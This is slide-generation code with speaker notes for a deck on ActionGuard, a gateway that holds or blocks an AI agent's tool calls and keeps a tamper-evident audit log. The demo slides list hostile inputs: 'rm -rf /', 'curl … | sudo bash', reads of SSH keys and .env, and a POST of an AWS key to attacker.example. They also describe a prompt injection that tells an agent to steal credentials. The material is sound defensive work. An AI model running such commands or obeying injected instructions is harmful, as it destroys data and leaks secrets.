    s.addNotes("Here's the whole idea in one picture. The agent calls a tool as usual. That tool is wrapped by our SDK, which is the policy enforcement point. Before the tool's code runs, the SDK sends the call to the gateway, the policy decision point. The gateway's policy engine returns one of three verdicts. Allow, and the tool runs. Review, and the call waits for a human. Deny, and the tool never runs. Every decision is written to a hash-chained audit ledger and pushed live to the dashboard, where a reviewer can approve or reject held actions. The agent never has the admin token, so it can't approve its own request.");
  }

  // 9 ── Architecture ───────────────────────────────────────────────────────
  {
    const s = slide("CONTENT_LIGHT", SEC.solution, "02 · OUR SOLUTION", "System architecture");
    const zone = (x, w, label) => {
      box(s, x, 1.6, w, 4.55, { fill: "F8FAFB", line: "B8C1CC", dash: "dash", radius: 0.06, name: "zone" });
      T(s, label, { x: x + 0.2, y: 1.68, w: w - 0.4, h: 0.3, fontSize: 11, bold: true, color: K.muted, charSpacing: 1.5, valign: "middle" });
    };
    zone(L, 2.6, "AGENT PROCESS");
    zone(3.95, 5.95, "GATEWAY · python3 -m actionguard");
    zone(10.3, 2.43, "OPERATOR");
    const R1 = [2.1, 0.95], R2 = [3.35, 1.25], R3 = [4.85, 1.05];
    const mod = (x, y, w, h, title, sub, o = {}) => {
      box(s, x, y, w, h, { fill: o.fill || "FFFFFF", line: o.line || HX.line, lw: o.lw || 1, radius: 0.06, name: "module" });
      T(s, [{ text: title, options: { fontFace: o.mono === false ? undefined : MONO, bold: true, fontSize: 13, color: o.titleColor || K.ink, breakLine: true } },
        { text: sub, options: { fontSize: 11, color: K.muted } }],
      { x: x + 0.12, y, w: w - 0.24, h, valign: "middle", align: "center" });
    };
    // agent zone
    mod(0.8, R1[0], 2.2, R1[1], "LLM agent loop", "decides which tool to call", { mono: false });
    mod(0.8, R2[0], 2.2, R2[1], "sdk.py · 76 LOC", "Guard · @protect · Blocked; fails closed", { fill: HX.tealTint, line: HX.tealD, lw: 1.5, titleColor: K.tealD });
    mod(0.8, R3[0], 2.2, R3[1], "Tools", "shell · files · http · db · email · payments", { mono: false });
    arrow(s, 1.9, R1[0] + R1[1], 1.9, R2[0], HX.muted);
    arrow(s, 1.9, R2[0] + R2[1], 1.9, R3[0], SEM.allow.dark);
    // gateway zone
    mod(4.2, R1[0], 2.6, R1[1], "engine.py · 136 LOC", "Policy · evaluate() · rate limit · lockdown");
    mod(7.05, R1[0], 2.6, R1[1], "policies/default.json", "20 rules · thresholds · hot reload");
    mod(4.2, R2[0], 5.45, R2[1], "server.py · 209 LOC", "ThreadingHTTPServer · REST API · SSE /v1/events · admin Bearer auth · input validation");
    mod(4.2, R3[0], 2.6, R3[1], "store.py · 133 LOC", "actions table · hash-chained audit · expiry");
    s.addShape(pres.shapes.CAN, { x: 7.05, y: R3[0], w: 2.6, h: R3[1], fill: { color: "FFFFFF" }, line: { color: HX.line, width: 1 }, objectName: nm("sqlite") });
    T(s, [{ text: "SQLite", options: { bold: true, fontSize: 13, breakLine: true } }, { text: "actionguard.db · actions + audit", options: { fontSize: 11, color: K.muted } }],
      { x: 7.15, y: R3[0] + 0.2, w: 2.4, h: R3[1] - 0.2, color: K.ink, align: "center", valign: "middle" });
    arrow(s, 7.05, R1[0] + 0.475, 6.8, R1[0] + 0.475, HX.muted);
    arrow(s, 5.5, R2[0], 5.5, R1[0] + R1[1], HX.muted);
    arrow(s, 5.5, R2[0] + R2[1], 5.5, R3[0], HX.muted);
    arrow(s, 6.8, R3[0] + 0.55, 7.05, R3[0] + 0.55, HX.muted);
    // operator zone
    mod(10.5, R1[0], 2.03, R1[1], "Security reviewer", "browser + admin token", { mono: false });
    mod(10.5, R2[0], 2.03, R2[1], "dashboard/", "index.html · 272 LOC · vanilla JS");
    mod(10.5, R3[0], 2.03, R3[1], "Admin actions", "approve · reject · lockdown · reload", { mono: false });
    arrow(s, 11.515, R1[0] + R1[1], 11.515, R2[0], HX.muted);
    arrow(s, 11.515, R2[0] + R2[1], 11.515, R3[0], HX.muted);
    // cross-process flows
    const flows = [
      [3.0, 3.75, 4.2, 3.75, 1, 3.47], [4.2, 4.2, 3.0, 4.2, 2, 3.47],
      [9.65, 3.75, 10.5, 3.75, 3, 9.95], [10.5, 4.2, 9.65, 4.2, 4, 9.95],
    ];
    for (const [x1, y1, x2, y2, num, mx] of flows) {
      arrow(s, x1, y1, x2, y2, HX.tealD, { width: 1.75 });
      numDot(s, mx, y1 < 4 ? y1 - 0.33 : y1 + 0.07, 0.26, num, HX.tealD, "FFFFFF", 11);
    }
    const legend = ["POST /v1/actions → verdict", "GET /v1/actions/{id} · poll", "SSE /v1/events → live feed", "Admin: approve · reject · lockdown"];
    legend.forEach((t, i) => {
      const x = L + i * 3.05;
      numDot(s, x, 6.36, 0.28, i + 1, HX.tealD, "FFFFFF", 11);
      T(s, t, { x: x + 0.36, y: 6.33, w: 2.65, h: 0.34, fontSize: 13, color: K.ink, valign: "middle" });
    });
    s.addNotes("This is the real component layout. On the left is the agent process. The LLM decides to call a tool, the SDK in sdk.py intercepts it, and only an allowed call reaches the tool. In the middle is the gateway. server.py handles HTTP, server-sent events and admin authentication. It asks engine.py for a verdict using the JSON policy, and store.py writes the action and an audit entry to SQLite. On the right, the reviewer uses the dashboard. Flow one is the action request, two is polling while a review is pending, three is the live event stream, and four is admin decisions, which need a Bearer token.");
  }

  // 10 ── Request lifecycle ─────────────────────────────────────────────────
  {
    const s = slide("CONTENT_LIGHT", SEC.solution, "02 · OUR SOLUTION", "Request lifecycle: allow, deny or review");
    const common = [
      [L, 1.8, "Agent calls a tool", "@guard.protect wrapper"],
      [2.75, 1.8, "SDK sends the call", "POST /v1/actions"],
      [4.9, 1.75, "Gateway decides", "evaluate() → record() → audit entry"],
    ];
    common.forEach(([x, w, a, b], i) => {
      box(s, x, 3.2, w, 1.0, { fill: HX.light, line: HX.line, radius: 0.08, name: "step" });
      T(s, [{ text: a, options: { bold: true, fontSize: 14, color: K.ink, breakLine: true } }, { text: b, options: { fontSize: 11, color: K.muted, fontFace: i === 1 ? MONO : undefined } }],
        { x: x + 0.12, y: 3.2, w: w - 0.24, h: 1.0, valign: "middle" });
      if (i < 2) arrow(s, x + w, 3.7, common[i + 1][0], 3.7, HX.ink);
    });
    const rows = [["allow", 2.25], ["deny", 3.7], ["review", 5.15]];
    for (const [k, y] of rows) {
      arrow(s, 6.65, 3.7, 7.1, y, HX.muted);
      pill(s, k, 7.1, y - 0.3, 1.25, 0.6, null, { size: 13 });
      arrow(s, 8.35, y, 8.75, y, HX.muted);
    }
    const out = (x, y, w, h, kind, text) => {
      s.addText(text, { shape: pres.shapes.ROUNDED_RECTANGLE, x, y, w, h, rectRadius: 0.08, fill: { color: SEM[kind].tint },
        line: { color: SEM[kind].dark, width: 1 }, color: K.ink, fontSize: 13, valign: "middle", margin: [2, 8, 2, 8], objectName: nm("outcome") });
    };
    out(8.75, 1.85, 3.98, 0.8, "allow", [{ text: "201 · status “allowed”", options: { bold: true, breakLine: true } }, { text: "the tool body runs" }]);
    out(8.75, 3.3, 3.98, 0.8, "deny", [{ text: "Blocked is raised", options: { bold: true, breakLine: true } }, { text: "the body never runs; reasons go back to the LLM" }]);
    out(8.75, 4.75, 1.85, 0.8, "review", [{ text: "“pending”", options: { bold: true, breakLine: true } }, { text: "SDK polls every 1 s", options: { fontSize: 12 } }]);
    arrow(s, 10.6, 5.15, 10.95, 5.15, HX.muted);
    out(10.95, 4.75, 1.78, 0.8, "review", [{ text: "Human decides", options: { bold: true, breakLine: true } }, { text: "approve → runs, reject → Blocked", options: { fontSize: 11 } }]);
    arrow(s, 9.675, 5.55, 9.675, 5.85, SEM.deny.dark);
    out(8.75, 5.85, 3.98, 0.6, "deny", [{ text: "No answer in 120 s → “expired” = denied", options: { bold: true } }]);
    box(s, L, 4.75, 6.05, 0.95, { fill: SEM.deny.tint, line: SEM.deny.dark, radius: 0.08, name: "fail-closed" });
    await icon(s, "FaLock", SEM.deny.dark, L + 0.2, 5.03, 0.38);
    T(s, [{ text: "Fail-closed by design", options: { bold: true, breakLine: true } }, { text: "Gateway unreachable, error or timeout → the SDK raises Blocked. Nothing runs by default." }],
      { x: L + 0.75, y: 4.75, w: 5.2, h: 0.95, fontSize: 13, color: K.ink, valign: "middle" });
    T(s, "Every step, including approvals and expiries, is appended to the audit chain and streamed to the dashboard.",
      { x: L, y: 6.0, w: 7.9, h: 0.45, fontSize: 13, italic: true, color: K.muted, valign: "middle" });
    s.addNotes("Let's follow one request. The agent calls a wrapped tool, the SDK posts it to the gateway, and the gateway evaluates it, stores it and appends an audit entry. There are three outcomes. Allowed: the gateway answers allowed and the function body runs. Denied: the SDK raises a Blocked exception, so the body never runs, and the reason goes back to the LLM so it can change course. Review: the action is pending, and the SDK polls every second while a human approves or rejects it in the dashboard. If nobody answers within 120 seconds it expires and counts as denied. And if the gateway is down, the SDK also blocks. It always fails closed.");
  }

  // 11 ── Policy engine algorithm ───────────────────────────────────────────
  {
    const s = slide("CONTENT_LIGHT", SEC.solution, "02 · OUR SOLUTION", "Policy engine: how a verdict is made");
    const steps = [
      ["Kill switch engaged?", "Yes → DENY with risk 100. Nothing else is checked."],
      ["Agent over its rate limit?", "More than 20 actions in 10 s → DENY (likely a runaway loop)."],
      ["Match every rule", "Tool glob · regex on an argument or the whole payload · numeric “above” limits."],
      ["Strictest effect wins", "deny > review > allow. Flags only add risk. No match → default (review)."],
      ["Apply risk thresholds", "Risk = sum of matched risk, max 100. ≥ 90 → DENY; ≥ 50 → at least REVIEW."],
    ];
    s.addShape(pres.shapes.LINE, { x: 0.85, y: 2.2, w: 0, h: 3.9, line: { color: HX.line, width: 2 }, objectName: nm("spine") });
    steps.forEach(([a, b], i) => {
      const y = 1.8 + i * 0.97;
      box(s, 1.3, y, 5.0, 0.85, { fill: HX.light, radius: 0.08, name: "algo-step" });
      numDot(s, L, y + 0.18, 0.5, i + 1, HX.ink, HX.teal, 15);
      T(s, [{ text: a, options: { bold: true, fontSize: 15, color: K.ink, breakLine: true } }, { text: b, options: { fontSize: 12, color: K.muted } }],
        { x: 1.5, y, w: 4.7, h: 0.85, valign: "middle" });
    });
    T(s, "Worked examples from the real policy (acme-default-v1)", { x: 6.75, y: 1.8, w: 5.98, h: 0.32, fontSize: 14, bold: true, color: K.muted });
    const ex = [
      ['run_shell("git push --force")', ["review-git-push      review +30", "flag-force-push      flag   +40"], "strictest is review; 70 ≥ 50 → review", 70, "review"],
      ['read_file(".env")', ["allow-workspace-reads allow  +0", "flag-env-file        flag   +60"], "allowed by a rule, but 60 ≥ 50 escalates it", 60, "review"],
      ["http_request(POST attacker.example)", ["flag-unknown-domain  flag   +50", "flag-pii (card no.)  flag   +40"], "90 ≥ 90 → deny outright", 90, "deny"],
    ];
    ex.forEach(([call, rules, why, risk, kind], i) => {
      const y = 2.2 + i * 1.53, x = 6.75, w = 5.98;
      box(s, x, y, w, 1.4, { fill: "FFFFFF", line: HX.line, radius: 0.08, name: "example" });
      T(s, call, { x: x + 0.2, y: y + 0.12, w: 4.2, h: 0.3, fontFace: MONO, bold: true, fontSize: 12, color: K.ink });
      T(s, rules.join("\n"), { x: x + 0.2, y: y + 0.45, w: 4.2, h: 0.48, fontFace: MONO, fontSize: 11, color: K.muted });
      T(s, why, { x: x + 0.2, y: y + 0.98, w: 4.2, h: 0.3, fontSize: 12, bold: true, color: SEM[kind].dark });
      T(s, "risk " + risk, { x: x + w - 1.5, y: y + 0.18, w: 1.3, h: 0.5, fontFace: "Cambria", fontSize: 22, bold: true, color: SEM[kind].dark, align: "center", valign: "middle" });
      pill(s, kind, x + w - 1.45, y + 0.8, 1.2, 0.38, null, { size: 12 });
    });
    s.addNotes("This is the decision algorithm in engine.py. First, if the kill switch is on, deny. Second, if this agent has made more than 20 calls in ten seconds, deny, because it's probably stuck in a loop. Third, every rule is matched against the tool name and arguments. Fourth, the strictest effect wins, and flags only add risk. Fifth, we sum the risk: 90 or more is a deny, 50 or more is at least a review. On the right are three real results. A force push scores 70 and goes to review. Reading .env is allowed by a rule, but the 60-point flag escalates it. And posting a card number to an unknown domain reaches 90, so it's denied.");
  }

  // 12 ── Key features ──────────────────────────────────────────────────────
  {
    const s = slide("CONTENT_LIGHT", SEC.solution, "02 · OUR SOLUTION", "Key features");
    const f = [
      ["FaFileCode", "Declarative policy", "JSON rules: tool globs, regex conditions, numeric limits; hot-reloaded.", "teal"],
      ["FaGaugeHigh", "Risk scoring", "Matched rules add risk; 50 or more escalates to review, 90 or more denies.", "teal"],
      ["FaUserCheck", "Human-in-the-loop", "Held actions wait for approve or reject; they expire after 120 s.", "review"],
      ["FaPowerOff", "Kill switch", "One click denies every agent action until security releases it.", "deny"],
      ["FaHourglassHalf", "Rate limiting", "More than 20 actions in 10 s from one agent is treated as a runaway loop.", "review"],
      ["FaLink", "Tamper-evident audit", "Each entry hashes the one before it (SHA-256); verify in one click.", "allow"],
      ["FaLock", "Fail-closed SDK", "Gateway down, error or timeout → Blocked. A tool never runs by accident.", "deny"],
      ["FaEye", "Explainable verdicts", "Every decision lists the rules that fired, their effect and their risk.", "teal"],
    ];
    const w = (CW - 0.9) / 4, h = 2.3;
    for (let i = 0; i < f.length; i++) {
      const [ic, head, desc, tone] = f[i];
      const x = L + (i % 4) * (w + 0.3), y = 1.8 + Math.floor(i / 4) * (h + 0.3);
      const tint = tone === "teal" ? HX.tealTint : SEM[tone].tint, col = tone === "teal" ? HX.tealD : SEM[tone].dark;
      box(s, x, y, w, h, { fill: "FFFFFF", line: HX.line, radius: 0.08, name: "feature-card" });
      await iconCircle(s, ic, x + 0.25, y + 0.22, 0.62, tint, col);
      T(s, head, { x: x + 0.25, y: y + 0.95, w: w - 0.5, h: 0.4, fontSize: 17, bold: true, color: K.ink });
      T(s, desc, { x: x + 0.25, y: y + 1.35, w: w - 0.5, h: 0.85, fontSize: 14, color: K.muted });
    }
    s.addNotes("Here are the eight features together. A declarative policy that people can read and review, validated on load and hot-reloadable. Risk scoring so that small signals add up. Human-in-the-loop approvals with a timeout. A kill switch that freezes every agent at once. A rate limit against runaway loops. A tamper-evident audit log built as a SHA-256 hash chain. An SDK that fails closed, so an outage never lets an action through. And explainability: every verdict shows exactly which rules fired and why. The colours match the verdicts: amber for review, red for blocking controls.");
  }

  // 13 ── Tech stack ────────────────────────────────────────────────────────
  pres.addSection({ title: SEC.impl });
  {
    const s = slide("CONTENT_LIGHT", SEC.impl, "03 · IMPLEMENTATION", "Tech stack and design decisions");
    box(s, L, 1.8, 3.6, 4.9, { fill: HX.ink, radius: 0.1, name: "zero-deps" });
    T(s, "0", { x: L + 0.35, y: 1.95, w: 2.9, h: 1.4, fontFace: "Cambria", fontSize: 96, bold: true, color: K.teal, valign: "middle" });
    T(s, "third-party runtime dependencies", { x: L + 0.35, y: 3.35, w: 2.9, h: 0.75, fontSize: 18, bold: true, color: K.white });
    T(s, "Python 3.10+ standard library only: http.server · sqlite3 · hashlib · hmac · re · fnmatch · threading",
      { x: L + 0.35, y: 4.15, w: 2.9, h: 1.0, fontSize: 13, color: HX.soft });
    T(s, "A security tool shouldn't widen your supply chain.", { x: L + 0.35, y: 5.6, w: 2.9, h: 0.8, fontSize: 15, italic: true, color: K.teal });
    const rows = [
      ["FaPython", "Python standard library", "Runs wherever Python runs; small enough to audit; nothing to pip install"],
      ["FaDatabase", "SQLite", "Embedded and transactional: the action row and its audit entry commit together"],
      ["FaTowerBroadcast", "Server-sent events", "One-way live push is all the dashboard needs; plain HTTP, browsers reconnect"],
      ["FaJs", "Vanilla JS dashboard", "One HTML file (272 lines) served by the gateway; no build step or framework"],
      ["FaFileCode", "JSON policy + regex", "Readable and diffable in a PR; an invalid policy is rejected and the old one kept"],
      ["FaVial", "unittest", "16 tests, including a real HTTP gateway on a random port; nothing to install"],
    ];
    for (let i = 0; i < rows.length; i++) {
      const [ic, a, b] = rows[i], y = 1.8 + i * 0.83;
      if (i) s.addShape(pres.shapes.LINE, { x: 4.6, y: y - 0.04, w: R - 4.6, h: 0, line: { color: HX.line, width: 0.75 }, objectName: nm("sep") });
      await iconCircle(s, ic, 4.6, y + 0.1, 0.56, HX.tealTint, HX.tealD);
      T(s, a, { x: 5.35, y, w: 2.55, h: 0.76, fontSize: 15, bold: true, color: K.ink, valign: "middle" });
      T(s, b, { x: 8.0, y, w: 4.73, h: 0.76, fontSize: 14, color: K.muted, valign: "middle" });
    }
    s.addNotes("We made one strong design decision: no third-party runtime dependencies. Everything uses the Python standard library: the HTTP server, SQLite, hashing and regular expressions. A security tool that pulls in dozens of packages makes your supply chain bigger, and the whole thing stays small enough for a reviewer to read. SQLite lets us write the action and its audit entry in one transaction. Server-sent events are enough for one-way live updates. The dashboard is a single HTML file with plain JavaScript. The policy is JSON, so changes can be reviewed in a pull request. Tests use the built-in unittest module.");
  }

  // 14 ── Implementation ────────────────────────────────────────────────────
  {
    const s = slide("CONTENT_LIGHT", SEC.impl, "03 · IMPLEMENTATION", "Implementation: small, readable modules");
    const m = (t) => ({ text: t, options: { fontFace: MONO, fontSize: 12, color: K.ink } });
    const loc = (t) => ({ text: t, options: { align: "right", bold: true, color: K.tealD } });
    const d = (t) => ({ text: t, options: { color: K.muted } });
    const head = (t, al) => ({ text: t, options: { bold: true, color: K.white, fill: { color: HX.ink }, align: al || "left" } });
    const rows = [
      [head("Module"), head("LOC", "right"), head("Responsibility")],
      [m("engine.py"), loc("136"), d("Rules, risk, rate limit, kill switch")],
      [m("store.py"), loc("133"), d("SQLite + hash-chained audit")],
      [m("server.py"), loc("209"), d("HTTP API, SSE, admin auth")],
      [m("sdk.py"), loc("76"), d("Guard, @protect, fail-closed")],
      [m("__init__ / __main__"), loc("8"), d("Package entry points")],
      [m("dashboard/index.html"), loc("272"), d("Live console (vanilla JS)")],
      [m("policies/default.json"), loc("167"), d("20-rule example policy")],
      [m("tests/"), loc("197"), d("16 unit + integration tests")],
      [m("demo/ (4 scripts)"), loc("315"), d("Scenarios, mocks, tamper, agent")],
    ];
    s.addTable(rows, { x: L, y: 1.8, w: 5.75, colW: [2.45, 0.7, 2.6], fontSize: 13, rowH: 0.42, valign: "middle",
      border: { type: "solid", pt: 0.75, color: HX.line }, margin: [2, 6, 2, 6], objectName: nm("module-table") });
    T(s, [{ text: "562 lines ", options: { bold: true, color: K.tealD } }, { text: "of Python in the core package (wc -l)", options: { color: K.muted } }],
      { x: L, y: 6.3, w: 5.75, h: 0.35, fontSize: 14, valign: "middle" });
    const code = (y, h, label, lines) => {
      box(s, 6.6, y, 6.13, h, { fill: HX.ink, radius: 0.08, name: "code-panel" });
      T(s, label, { x: 6.85, y: y + 0.12, w: 5.7, h: 0.28, fontSize: 12, bold: true, color: K.teal, valign: "middle" });
      T(s, lines.map((l, i) => ({ text: l[0], options: { color: l[1] || "E6EAF0", breakLine: i < lines.length - 1 } })),
        { x: 6.85, y: y + 0.45, w: 5.75, h: h - 0.55, fontFace: MONO, fontSize: 11 });
    };
    const G = HX.mutedDark, Y = SEM.review.bright, Gr = SEM.allow.bright, Rd = SEM.deny.bright;
    code(1.8, 2.15, "policies/default.json · one rule", [
      ["{"], ['  "id": "review-large-payment",'], ['  "description": "Payment above 1,000 needs a human",'],
      ['  "tool": "transfer_funds",'], ['  "above": { "amount": 1000 },'], ['  "effect": "review",', Y], ['  "risk": 40'], ["}"],
    ]);
    code(4.15, 2.6, "Wrapping a tool with the SDK", [
      ["guard = Guard(agent=\"devops-bot\")"], [""],
      ["@guard.protect()                # asks the gateway first", Gr],
      ["def run_shell(command: str) -> str:"],
      ["    return subprocess.check_output(command, shell=True)"], [""],
      ["try:"], ["    run_shell(\"rm -rf /\")       # never executes", Rd],
      ["except Blocked as e:"], ["    print(e)                    # reason goes back to the LLM", G],
    ]);
    s.addNotes("The implementation is deliberately small. The core package is 562 lines of Python: 136 for the engine, 133 for the store, 209 for the HTTP server and 76 for the SDK. The dashboard is one 272-line HTML file, and there are 197 lines of tests. On the right, the top panel is one real policy rule: any transfer above 1,000 needs review and adds 40 risk. The bottom panel shows how a developer uses it. You add the protect decorator to a tool function. If the gateway denies the call, the body never runs and a Blocked exception carries the reason back to the agent.");
  }

  // 15 ── Live demo ─────────────────────────────────────────────────────────
  {
    const s = slide("CONTENT_LIGHT", SEC.impl, "03 · IMPLEMENTATION", "Live demo: six scenarios");
    [["SCENARIO", 1.35], ["WHAT THE AGENT TRIES", 4.95], ["VERDICTS FROM THE GATEWAY", 9.55]].forEach(([t, x]) =>
      T(s, t, { x, y: 1.68, w: 3.5, h: 0.28, fontSize: 11, bold: true, color: K.muted, charSpacing: 1.5, valign: "middle" }));
    const sc = [
      ["Routine engineering work", "read README · git status · pytest · SELECT query", [["allow", "ALLOW ×4"]]],
      ["Prompt injection → credential theft", "poisoned page, then read ~/.ssh/id_rsa · read .env · POST an AWS key to attacker", [["allow", "ALLOW"], ["deny"], ["review"], ["deny"]]],
      ["Destructive commands", "rm -rf / · DROP TABLE customers · curl … | sudo bash", [["deny", "DENY ×3"]]],
      ["Human-in-the-loop", "pay 250 · pay 25,000 · email cfo@acme.com · email someone outside the company", [["allow"], ["review"], ["allow"], ["review"]]],
      ["Runaway loop", "25 rapid read_file calls from one agent", [["allow", "ALLOW ×20"], ["deny", "DENY ×5"]]],
      ["Kill switch", "lockdown on → git status · lockdown off → git status", [["deny"], ["allow"]]],
    ];
    sc.forEach(([title, acts, pills], i) => {
      const y = 2.05 + i * 0.73;
      box(s, L, y, CW, 0.66, { fill: i % 2 ? "FFFFFF" : HX.light, radius: 0.06, name: "scenario-row" });
      numDot(s, 0.75, y + 0.12, 0.42, i + 1, HX.ink, HX.teal, 14);
      T(s, title, { x: 1.35, y, w: 3.45, h: 0.66, fontSize: 15, bold: true, color: K.ink, valign: "middle" });
      T(s, acts, { x: 4.95, y, w: 4.45, h: 0.66, fontSize: 13, color: K.muted, valign: "middle" });
      let x = 9.55;
      for (const [k, label] of pills) {
        const t = label || SEM[k].label, w = Math.max(0.68, 0.2 + t.length * 0.085);
        pill(s, k, x, y + 0.17, w, 0.32, t, { size: 10 });
        x += w + 0.07;
      }
    });
    T(s, [{ text: "Run it: ", options: { bold: true, color: K.ink } }, { text: "python3 -m actionguard", options: { fontFace: MONO, color: K.tealD } },
      { text: "   then   ", options: { color: K.muted } }, { text: "python3 demo/run_demo.py", options: { fontFace: MONO, color: K.tealD } }],
    { x: L, y: 6.5, w: CW, h: 0.3, fontSize: 13, valign: "middle" });
    s.addNotes("Now the live demo. It's scripted and deterministic, with mock tools, so nothing real is touched. Scenario one is routine work, and everything is allowed with no friction. Scenario two is a prompt injection: a web page hides instructions telling the agent to steal SSH keys and the .env file. The key read is denied, .env is held for review, and the exfiltration is denied. Scenario three is destructive commands, all denied. Four shows human approval for a large payment and an external email. Five is a runaway loop, cut off after 20 calls. Six is the kill switch. Let me switch to the terminal and the dashboard.");
  }

  // 16 ── Dashboard screenshot ──────────────────────────────────────────────
  {
    const s = slide("CONTENT_DARK", SEC.impl, "03 · IMPLEMENTATION", "The live dashboard");
    const X0 = L, Y0 = 1.7, W = 8.4, H = W * 9 / 16, k = W / 2000;
    box(s, X0 - 0.03, Y0 - 0.03, W + 0.06, H + 0.06, { fill: HX.panel, line: HX.panelLine, name: "frame" });
    s.addImage({ path: IMG("dashboard.png"), x: X0, y: Y0, w: W, h: H, objectName: "dashboard-screenshot",
      altText: "ActionGuard dashboard: live counters, action feed with risk bars and statuses, approval queue, audit ledger and active policy" });
    const marks = [[390, 120], [330, 262], [1800, 446], [1908, 95]];
    marks.forEach(([px, py], i) => numDot(s, X0 + px * k - 0.17, Y0 + py * k - 0.17, 0.34, i + 1, HX.teal, HX.ink, 13));
    const notes = [
      ["Live counters", "Actions inspected, allowed, awaiting a human, blocked and agents seen, pushed over SSE."],
      ["Action feed", "Agent, tool, arguments, risk bar and final status for every call; click a row for the reasons."],
      ["Approval queue", "Held actions wait here. Approve or Reject sends an admin-authenticated decision."],
      ["Kill switch", "One click engages lockdown: every agent action is denied until it is released."],
    ];
    notes.forEach(([a, b], i) => {
      const y = 1.75 + i * 1.17;
      numDot(s, 9.35, y, 0.38, i + 1, HX.teal, HX.ink, 14);
      T(s, a, { x: 9.88, y: y - 0.02, w: 2.85, h: 0.38, fontSize: 16, bold: true, color: K.white, valign: "middle" });
      T(s, b, { x: 9.88, y: y + 0.38, w: 2.85, h: 0.75, fontSize: 13, color: HX.soft });
    });
    source(s, "Screenshot of the running gateway (dashboard/index.html) after the scripted demo; 3200 × 1800 px.", L, 6.5, W, { dark: true });
    s.addNotes("This is the dashboard, served by the gateway itself. At the top are live counters: actions inspected, allowed, waiting for a human and blocked. The main table is the live action feed. Each row shows the agent, the tool, the arguments, a risk bar and the final status. You can see the runaway loop: twenty allowed reads and then denials. On the right is the approval queue. Here a 48,000 payment is waiting, and the reviewer can approve or reject it. In the top corner is the kill switch. Everything updates instantly through server-sent events, with no page refresh.");
  }

  // 17 ── Explainability + audit ────────────────────────────────────────────
  {
    const s = slide("CONTENT_DARK", SEC.impl, "03 · IMPLEMENTATION", "Explainable verdicts, verifiable audit");
    const X0 = L, Y0 = 1.7, W = 7.6, H = W * 9 / 16, k = W / 2000;
    box(s, X0 - 0.03, Y0 - 0.03, W + 0.06, H + 0.06, { fill: HX.panel, line: HX.panelLine, name: "frame" });
    s.addImage({ path: IMG("dashboard-detail.png"), x: X0, y: Y0, w: W, h: H, objectName: "dashboard-detail-screenshot",
      altText: "Expanded action showing why it was denied, and the audit ledger reporting the chain intact" });
    box(s, X0 + 32 * k, Y0 + 783 * k, 1462 * k, 214 * k, { line: HX.teal, lw: 2, radius: 0.04, name: "highlight-why" });
    box(s, X0 + 1527 * k, Y0 + 696 * k, 440 * k, 62 * k, { line: HX.teal, lw: 2, radius: 0.04, name: "highlight-chain" });
    numDot(s, X0 + 1494 * k - 0.13, Y0 + 890 * k - 0.15, 0.3, "A", HX.teal, HX.ink, 12);
    numDot(s, X0 + 1967 * k - 0.13, Y0 + 727 * k - 0.15, 0.3, "B", HX.teal, HX.ink, 12);
    const rx = 8.6, rw = R - rx;
    numDot(s, rx, 1.75, 0.34, "A", HX.teal, HX.ink, 12);
    T(s, "Why was it blocked?", { x: rx + 0.45, y: 1.73, w: rw - 0.45, h: 0.38, fontSize: 16, bold: true, color: K.white, valign: "middle" });
    T(s, "Each row expands to the verdict and every rule that fired: deny-secret-exfiltration (+100) and flag-unknown-domain (+50).",
      { x: rx + 0.45, y: 2.13, w: rw - 0.45, h: 0.85, fontSize: 13, color: HX.soft });
    numDot(s, rx, 3.08, 0.34, "B", HX.teal, HX.ink, 12);
    T(s, "Chain intact: 48 entries", { x: rx + 0.45, y: 3.06, w: rw - 0.45, h: 0.38, fontSize: 16, bold: true, color: K.white, valign: "middle" });
    T(s, "“Verify audit chain” recomputes every SHA-256 link from the genesis hash.", { x: rx + 0.45, y: 3.46, w: rw - 0.45, h: 0.55, fontSize: 13, color: HX.soft });
    box(s, rx, 4.15, rw, 1.75, { fill: HX.panel, line: HX.panelLine, radius: 0.06, name: "tamper-terminal" });
    T(s, [
      { text: "$ python3 demo/tamper.py", options: { color: K.white, breakLine: true } },
      { text: "Rewrote entry #6: deny -> allow", options: { color: HX.mutedDark, breakLine: true } },
      { text: " ", options: { breakLine: true } },
      { text: "[Verify audit chain]", options: { color: K.teal, breakLine: true } },
      { text: "TAMPERING DETECTED at entry #6", options: { color: SEM.deny.bright, bold: true, breakLine: true } },
      { text: "5 entries verified before the break", options: { color: HX.mutedDark } },
    ], { x: rx + 0.2, y: 4.27, w: rw - 0.4, h: 1.55, fontFace: MONO, fontSize: 11 });
    T(s, "hash = SHA-256(prev, ts, id, event, data)", { x: rx, y: 6.02, w: rw, h: 0.3, fontFace: MONO, fontSize: 11, color: K.teal });
    source(s, "Tamper run on a copy of the demo database; the result matches tests/test_actionguard.py.", L, 6.12, W, { dark: true });
    s.addNotes("Two things make ActionGuard trustworthy. First, explainability. Click any row and you see why: this exfiltration attempt matched the secret-exfiltration rule for 100 risk and the unknown-domain flag for 50. Second, a verifiable audit log. Every entry stores the hash of the entry before it, so the entries form a chain. The tamper script plays an insider who edits the database directly and changes a deny into an allow. When we click verify, the gateway recomputes every hash and reports exactly which entry was changed. The tamper is detected, and you can't edit the history quietly.");
  }

  // 18 ── Testing & results ─────────────────────────────────────────────────
  pres.addSection({ title: SEC.eval });
  {
    const s = slide("CONTENT_LIGHT", SEC.eval, "04 · EVALUATION", "Testing and results");
    box(s, L, 1.8, 4.0, 1.7, { fill: SEM.allow.tint, line: SEM.allow.dark, radius: 0.08, name: "tests-card" });
    T(s, "16 / 16", { x: L + 0.3, y: 1.9, w: 3.4, h: 0.85, fontFace: "Cambria", fontSize: 48, bold: true, color: SEM.allow.dark, valign: "middle" });
    T(s, "unit and integration tests passing", { x: L + 0.3, y: 2.75, w: 3.4, h: 0.32, fontSize: 15, color: K.ink });
    T(s, "python3 -m unittest discover -s tests", { x: L + 0.3, y: 3.1, w: 3.6, h: 0.28, fontFace: MONO, fontSize: 10, color: K.muted });
    T(s, [
      { text: "Engine (11)", options: { bold: true, color: K.ink, fontSize: 14, breakLine: true } },
      { text: "allow, deny and review cases · flag escalation · risk accumulation · default fallback · chained-shell and known-bypass regressions · rate limit · lockdown · invalid policy rejected", options: { color: K.muted, fontSize: 12, breakLine: true } },
      { text: " ", options: { fontSize: 6, breakLine: true } },
      { text: "Gateway + SDK (5)", options: { bold: true, color: K.ink, fontSize: 14, breakLine: true } },
      { text: "SDK allows and blocks · approval flow (agent can't self-approve: 401) · fail-closed when gateway is down · input validation (400) · audit tamper detection", options: { color: K.muted, fontSize: 12 } },
    ], { x: L, y: 3.7, w: 4.0, h: 3.0 });
    // doughnut of the real --auto run
